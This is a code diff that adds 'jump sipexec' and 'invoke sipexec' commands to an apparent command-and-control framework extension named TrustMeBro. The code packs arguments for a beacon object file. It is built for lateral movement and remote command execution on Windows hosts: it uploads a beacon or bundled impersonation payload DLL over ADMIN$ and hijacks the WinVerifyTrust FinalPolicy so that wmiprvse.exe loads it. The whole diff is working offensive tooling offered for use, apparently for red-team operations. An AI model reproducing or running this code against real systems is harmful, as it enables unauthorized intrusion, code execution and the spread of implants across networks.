@@ -125,3 +125,80 @@ cmd_fg.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 // ---- Register ----
 var tmb_group = ax.create_commands_group("TrustMeBro", [cmd_probe, cmd_fp, cmd_sip, cmd_wow, cmd_cp, cmd_se, cmd_clean, cmd_fg]);
 ax.register_commands_group(tmb_group, ["beacon", "gopher"], ["windows"], []);
+
+// ================================================================
+// SIPExec — Lateral movement via WinVerifyTrust FinalPolicy hijack
+// ================================================================
+
+// ---- jump sipexec ----
+var _cmd_jump_sipexec = ax.create_command("sipexec", "Lateral movement via WinVerifyTrust FinalPolicy hijack (DLL loads in wmiprvse.exe)", "jump sipexec 192.168.0.1 /tmp/beacon.dll -s ADMIN$ -g default");
+_cmd_jump_sipexec.addArgString("target", true);
+_cmd_jump_sipexec.addArgFile("dll", true);
+_cmd_jump_sipexec.addArgFlagString("-s", "share", "Upload share", "ADMIN$");
+_cmd_jump_sipexec.addArgFlagString("-g", "guid", "FinalPolicy GUID alias: default, driver, https", "default");
+_cmd_jump_sipexec.addArgBool("--no-cleanup", "Skip registry restore and file deletion");
+_cmd_jump_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let target = parsed_json["target"];
+    let dll_content = parsed_json["dll"];
+    let share = parsed_json["share"];
+    let guid = parsed_json["guid"];
+    let no_cleanup = parsed_json["--no-cleanup"] ? 1 : 0;
+
+    // Pack: mode(short) target(cstr) command(cstr) dll_len(int) dll_data(bytes) dll_path_override(cstr) share(cstr) guid(cstr) no_cleanup(short)
+    let bof_params = ax.bof_pack("short,cstr,cstr,int,bytes,cstr,cstr,cstr,short",
+        [0, target, "", dll_content.length, dll_content, "", share, guid, no_cleanup]);
+    let bof_path = bof_dir + "tmb_sipexec.o";
+    let message = `Task: SIPExec jump to ${target} via FinalPolicy hijack`;
+
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
+});
+
+// ---- invoke sipexec (remote-exec equivalent) ----
+var _cmd_invoke_sipexec = ax.create_command("sipexec", "Remote command execution via WinVerifyTrust FinalPolicy hijack + named pipe", "invoke sipexec 192.168.0.1 \"whoami /all\" --dll /tmp/payload.dll -g default");
+_cmd_invoke_sipexec.addArgString("target", true);
+_cmd_invoke_sipexec.addArgString("cmd", true);
+_cmd_invoke_sipexec.addArgFile("--dll", false);
+_cmd_invoke_sipexec.addArgFlagString("--unc", "unc_path", "Use existing UNC path (fileless on target)", "");
+_cmd_invoke_sipexec.addArgFlagString("-s", "share", "Upload share", "ADMIN$");
+_cmd_invoke_sipexec.addArgFlagString("-g", "guid", "FinalPolicy GUID alias", "default");
+_cmd_invoke_sipexec.addArgBool("--no-cleanup", "Skip cleanup");
+_cmd_invoke_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let target = parsed_json["target"];
+    let cmd = parsed_json["cmd"];
+    let share = parsed_json["share"];
+    let guid = parsed_json["guid"];
+    let no_cleanup = parsed_json["--no-cleanup"] ? 1 : 0;
+    let unc_path = parsed_json["unc_path"] || "";
+
+    let dll_content = parsed_json["--dll"] || "";
+    let dll_len = dll_content.length;
+
+    // If UNC override, no upload
+    if (unc_path.length > 0) {
+        dll_content = "";
+        dll_len = 0;
+    } else if (dll_len == 0) {
+        // Use bundled payload
+        let bundled_path = ax.script_dir() + "../sipexec/sipexec_payload_impersonate.dll";
+        dll_content = ax.read_file(bundled_path);
+        dll_len = dll_content.length;
+        if (dll_len == 0) throw new Error("Cannot read bundled payload DLL: " + bundled_path);
+    }
+
+    let bof_params = ax.bof_pack("short,cstr,cstr,int,bytes,cstr,cstr,cstr,short",
+        [1, target, cmd, dll_len, dll_content, unc_path, share, guid, no_cleanup]);
+    let bof_path = bof_dir + "tmb_sipexec.o";
+    let message = `Task: SIPExec exec on ${target}: ${cmd}`;
+
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
+});
+
+// ---- Register jump/invoke with sipexec as subcommand ----
+var cmd_jump_sipexec = ax.create_command("jump", "Lateral movement via WinVerifyTrust");
+cmd_jump_sipexec.addSubCommands([_cmd_jump_sipexec]);
+
+var cmd_invoke_sipexec = ax.create_command("invoke", "Remote execution via WinVerifyTrust");
+cmd_invoke_sipexec.addSubCommands([_cmd_invoke_sipexec]);
+
+var tmb_lateral_group = ax.create_commands_group("TrustMeBro-Lateral", [cmd_jump_sipexec, cmd_invoke_sipexec]);
+ax.register_commands_group(tmb_lateral_group, ["beacon", "gopher"], ["windows"], []);
